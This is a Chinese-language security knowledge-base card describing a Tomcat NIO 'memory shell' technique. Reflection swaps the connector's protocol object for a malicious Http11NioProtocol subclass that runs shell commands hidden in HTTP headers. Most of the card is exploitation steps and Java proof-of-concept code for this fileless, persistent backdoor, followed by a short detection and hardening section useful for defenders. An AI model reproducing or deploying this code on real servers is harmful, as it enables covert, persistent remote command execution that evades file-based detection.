---
id: web-java-component-tomcat-connectionhandler-proto-getclientcertprovider-memshell
title: Tomcat ConnectionHandler.proto 内存马：反射替换 Http11NioProtocol 为恶意子类，重写 getClientCertProvider 在 Processor 处理前执行命令
type: scenario
domain: web
path: web/java/component/tomcat
technique: tomcat-connectionhandler-proto-getclientcertprovider-memshell
tags:
- java
- tomcat
- memshell
- coyote
- connector
- http11
- nio
- reflection
- persistence
- rce
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V671
  verified_at: '2026-11-13T10:16:47+08:00'
  notes: 已对照原文与6图核对：ConnectionHandler.process 中 setSslSupport(getProtocol().getClientCertProvider()) 关键行、private final proto 反射替换、Acceptor->this$0->handler 定位、pollers->channelArray->attachment.socket.appReadBufHandler.byteBuffer.hb 取报文均一致；回显缺失、命令滞后一次、单版本未验证与原缺点一致；原文未标 Tomcat 受影响版本；未执行 PoC。仅修正'Request 尚未创建'表述为 Servlet 侧请求对象未初始化
url: /docs/web/java/component/tomcat/web-java-component-tomcat-connectionhandler-proto-getclientcertprovider-memshell/
draft: false
kb_aliases:
- Http11NioProtocol 内存马
- EvilHttp11NioProtocol
- ConnectionHandler.proto 替换
- getClientCertProvider 内存马
- Processor 层内存马
- AbstractProtocol$ConnectionHandler
- NIO 原始报文 hb 读取
---

## 一句话结论

在已能执行一次 Java 代码的 Tomcat NIO 中，反射拿到 `AbstractProtocol$ConnectionHandler` 对象并把其 `private final AbstractProtocol<S> proto` 字段替换为继承 `Http11NioProtocol` 的恶意子类；子类重写 `getClientCertProvider()`——该方法在每个请求的 `ConnectionHandler.process` 里、`processor.process` 之前被无条件调用（`processor.setSslSupport(wrapper.getSslSupport(getProtocol().getClientCertProvider()))`）——在方法里从 NIO Socket 缓冲区读取原始 HTTP 报文、按标记取出命令并用 `ProcessBuilder` 执行，再用 `super.getClientCertProvider()` 保持业务正常，形成 Connector 层、无文件的内存马。

## 原理

- **调用链上的可利用点**：文章调试出的 Servlet 访问链为 `NioEndpoint$SocketProcessor.doRun → AbstractProtocol$ConnectionHandler.process → AbstractProcessorLight.process → Http11Processor.service → CoyoteAdapter.service → StandardHostValve/StandardWrapperValve → StandardWrapper.allocate → Servlet.init`。在 `ConnectionHandler.process` 内部、`processor.process(wrapper, status)` 之前有一行关键代码：`processor.setSslSupport(wrapper.getSslSupport(getProtocol().getClientCertProvider()))`——`getProtocol()` 返回 `this.proto`（连接器共享的协议对象），`getClientCertProvider()` 在每个请求进入 Processor 前都会被调用。
- **把"每次请求的固定调用"变成代码执行**：`getClientCertProvider()` 是 `AbstractProtocol` 的可覆写方法，攻击者定义一个继承 `Http11NioProtocol` 的 `EvilHttp11NioProtocol`，在重写的 `getClientCertProvider()` 里插入恶意逻辑，最后返回 `super.getClientCertProvider()`，连接器行为不变。
- **替换 proto 字段**：`ConnectionHandler` 没有 `setProtocol()`，但持有 `private final AbstractProtocol<S> proto`。文章用反射清除 `final` 再 `field.set(handler, new EvilHttp11NioProtocol())`：`Field.class.getDeclaredField("modifiers")` → `modifiersField.setInt(f, f.getModifiers() & ~Modifier.FINAL)`。修改的是连接器共享对象，之后所有请求都会走恶意子类。
- **定位 ConnectionHandler 对象**：遍历 `Thread.currentThread().getThreadGroup()` 的 `threads`，找名字同时含 `Acceptor` 与 `http-nio` 的线程（NIO Acceptor 线程），沿 `thread.target`（Acceptor）→ `this$0`（NioEndpoint）→ `handler` 字段取出 `AbstractProtocol$ConnectionHandler`。
- **在 Request 初始化前取参数**：此时 Servlet 侧请求对象尚未初始化（原文：Request 对象还没有初始化），无法用 `getParameter/getHeader` 正常取参。文章沿 NIO 对象图直接读原始报文：Acceptor → `this$0`（NioEndpoint）→ `pollers[]` → `selector.channelArray[]` → `attachment`（NioSocketWrapper）→ `socket` → `appReadBufHandler` → `byteBuffer` → `hb`（byte[]），把字节转成字符串后按 `ikun<命令>ikun` 标记截取命令。
- **为什么成立**：`getClientCertProvider()` 是连接器每个请求都会调用的固定路径，覆盖它等价于在 Connector 层插入永久的 pre-Processor 钩子；且只改内存对象、不落文件、不注册新组件，对业务请求无影响（`super` 调用兜底），因此隐蔽性较好。文章验证方式是在 HTTP 头加入 `cmd: ikunnotepadikun` 触发记事本。
- **已知限制**（文章实测）：① 读到的是 Socket 缓冲区里"上一次报文"的字节，因此"第一次发报文注入，下一次访问才执行上一次的参数"；② 当前版本暂无法回显（PoC 中 `getResponse` 被注释），只能盲执行；③ 仅在作者测试的单个 Tomcat 版本验证，未覆盖其他版本。

## 触发条件

- 攻击者已获得一次 Java 代码执行能力（如 JSP Webshell、反序列化、表达式注入）来执行反射注入代码。
- Tomcat 使用 NIO Connector（`Http11NioProtocol`，线程名含 `http-nio` 与 `Acceptor`），APR/NIO2 不适用。
- 运行环境允许反射修改 `final` 字段（文章的实现依赖 `Field.modifiers`；JDK 9+ 模块强封装后该反射路径可能失败，需要 `--add-opens` 或 Unsafe 等替代，文章未涉及）。
- 后续请求可通过同一连接/连接池发送带命令标记的 HTTP 报文。

## 利用步骤

1. 通过已有代码执行入口执行注入逻辑：`getTheHandler()` 遍历线程找到 Acceptor，取出 `AbstractProtocol$ConnectionHandler` 对象。
2. `obj.getClass().getDeclaredField("proto")`，用 `makeSettable()` 清除 `final` 并 `set(obj, new EvilHttp11NioProtocol())`。
3. 恶意子类重写 `getClientCertProvider()`：从 NIO poller 的 `channelArray` 链读取 `appReadBufHandler.byteBuffer.hb`，按 `ikun...ikun` 提取命令并 `ProcessBuilder` 执行，最后 `return super.getClientCertProvider()`。
4. 发送带 `cmd: ikun<命令>ikun` 的请求注入参数；下一次请求时 `getClientCertProvider()` 读取到上一次报文中的命令并执行（盲执行，无回显）。

## PoC

```java
// 反射获取 ConnectionHandler（NIO Acceptor 线程：target=Acceptor -> this$0=NioEndpoint -> handler）
public Object getTheHandler() throws Exception {
    Thread[] threads = (Thread[]) getField(Thread.currentThread().getThreadGroup(), "threads");
    for (Thread thread : threads) {
        if (thread.getName().contains("Acceptor") && thread.getName().contains("http-nio")) {
            return getField(getField(getField(thread, "target"), "this$0"), "handler");
        }
    }
    return new Object();
}

// 清除 private final
public static void makeSettable(Field f) throws Exception {
    Field modifiersField = Field.class.getDeclaredField("modifiers");
    modifiersField.setAccessible(true);
    modifiersField.setInt(f, f.getModifiers() & ~Modifier.FINAL);
    f.setAccessible(true);
}

// 注入
Object handler = getTheHandler();
Field proto = handler.getClass().getDeclaredField("proto");
makeSettable(proto);
proto.set(handler, new EvilHttp11NioProtocol());
```

```java
// 恶意协议子类：每个请求在 ConnectionHandler.process 中触发 getClientCertProvider
public class EvilHttp11NioProtocol extends Http11NioProtocol {
    @Override
    public String getClientCertProvider() {
        try {
            String cmd = getCmd(getRequest()); // 报文形如 "cmd: ikunnotepadikun"
            if (!cmd.isEmpty()) {
                String[] cmds = System.getProperty("os.name").toLowerCase().contains("windows")
                        ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd};
                new ProcessBuilder(cmds).start(); // 文章 PoC 未实现回显
            }
        } catch (Exception ignored) {}
        return super.getClientCertProvider();
    }

    // 从 NIO Socket 缓冲区读原始报文：Acceptor -> this$0(pollers) -> selector.channelArray -> attachment.socket.appReadBufHandler.byteBuffer.hb
    public String getRequest() throws Exception {
        Thread[] threads = (Thread[]) getField(Thread.currentThread().getThreadGroup(), "threads");
        for (Thread thread : threads) {
            if (thread.getName().contains("Acceptor") && thread.getName().contains("http-nio")) {
                Object[] pollers = (Object[]) getField(getField(getField(thread, "target"), "this$0"), "pollers");
                for (Object poller : pollers) {
                    Object[] channels = (Object[]) getField(getField(poller, "selector"), "channelArray");
                    for (Object ch : channels) {
                        if (ch != null) {
                            byte[] hb = (byte[]) getField(getField(getField(
                                    getField(getField(ch, "attachment"), "socket"),
                                    "appReadBufHandler"), "byteBuffer"), "hb");
                            return new String(hb);
                        }
                    }
                }
            }
        }
        return "";
    }

    public String getCmd(String str) {
        return str.substring(str.indexOf("ikun") + 4, str.lastIndexOf("ikun"));
    }
}
```

## 变体与关联

- 变体：同属 Tomcat Connector 层内存马家族，但注入对象与触发点不同——Adapter 内存马替换 `AbstractProcessor.adapter`（进入容器前 `CoyoteAdapter.service`）、Handler 内存马替换 `NioEndpoint.handler`（`ConnectionHandler.process` 调 Endpoint Handler）、Executor 内存马替换 `NioEndpoint.executor`、Upgrade 内存马注册 `httpUpgradeProtocols`、本卡替换 `AbstractProtocol$ConnectionHandler.proto` 并覆盖 `getClientCertProvider`；同一台 Tomcat 可分别检测这些字段的实现类。
- 关联：[[web-java-component-tomcat-handler-memshell]]（同为 Connector 预解析层，用 read/unRead 取原始报文并回显）、[[web-java-component-tomcat-adapter-memshell]]、[[web-java-component-tomcat-executor-memshell]]、[[web-java-component-tomcat-upgrade-memshell]]、[[web-java-component-tomcat-valve-memshell]]（容器层内存马对照）。
- 边界：JDK 9+ 模块封装下 `Field.modifiers` 反射可能不可用；非 NIO Connector（APR/NIO2）不适用；无回显、命令滞后一个请求。

## 检测与防御

- 检测：检查 `AbstractProtocol$ConnectionHandler` 的 `proto` 字段实现类是否为 Tomcat 原始 `Http11NioProtocol`，出现自定义子类即高置信告警（可用 arthas `vmtool` 枚举）。监控对 `java.lang.reflect.Field.modifiers` 与 `ConnectionHandler.proto` 的反射访问；Tomcat 进程异常派生 `cmd.exe`/`/bin/sh`；线程/对象图中出现 `EvilHttp11NioProtocol` 类名。
- 修复：该手法本身不依赖产品漏洞，前提是攻击者已有代码执行——根本防御是阻断初始入口（Webshell 查杀、反序列化与表达式注入修复）。
- 加固：使用 RASP/Java Agent 监控 Connector 核心对象字段替换与反射改 final；限制 JSP/动态代码执行；服务端开启最小权限与出站监控；升级 Tomcat 并保持组件完整性校验。
